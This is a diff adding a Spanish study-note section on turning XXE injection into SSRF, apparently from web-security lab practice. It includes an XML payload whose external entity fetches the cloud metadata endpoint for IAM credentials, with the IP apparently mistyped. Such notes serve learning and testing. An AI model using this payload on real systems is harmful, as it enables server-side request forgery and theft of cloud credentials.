@@ -105,12 +105,41 @@ La URL puede usar el file://protocolo, por lo que las entidades externas se pued
   ```
 El &xxe; llama a la entidad que definimos en el DTD
   
+# Exploiting XXE to perform SSRF attacks
+  
+  Podemos mediante el xxe hacer que el servidor visite url a las que tiene acceso por ejemplo a las de la red interna o  algun endpoint.
+  
+  > Además de la recuperación de datos confidenciales, el otro impacto principal de los ataques XXE es que pueden usarse para realizar una falsificación de solicitudes del lado del servidor (SSRF). Esta es una vulnerabilidad potencialmente grave en la que se puede inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a cualquier URL a la que pueda acceder el servidor.
+  
+  Para este ataque nos damos cuenta que se envia un xml inyectamos en los parametros la entity y nos damos cuenta que en el primer elemento
+  nos regresa una ruta asi se va sacando poco a poco informacion hasta que llegamos a obtener las claves el IAM de AWs
+  
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.168.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck>
+<productId>
+&xxe;</productId>
+<storeId>
+1
+</storeId>
+</stockCheck>
+  
+  ```
+  
+  Necesitariamos saber que esa IP tiene un endpoint que el servidor tiene acceso 
+  
+  
+  
   
   
 Referencias
 
 Validador de XML
+  
 > http://xmlvalidator.new-studio.org/
+  
 > https://portswigger.net/web-security/xxe/xml-entities
+  
 > https://www.xmlvalidation.com/
   
